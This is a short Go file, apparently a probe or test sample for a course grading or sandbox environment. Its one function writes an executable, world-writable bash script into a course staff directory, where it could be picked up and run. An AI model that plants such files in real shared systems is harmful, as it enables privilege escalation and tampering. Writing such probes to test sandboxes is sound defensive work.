package hack

import "io/ioutil"

func Hack(){
	ioutil.WriteFile("/course/cs666/tabin/hack",[]byte("#!/bin/bash\n/home/whoami\n"),0777)
}
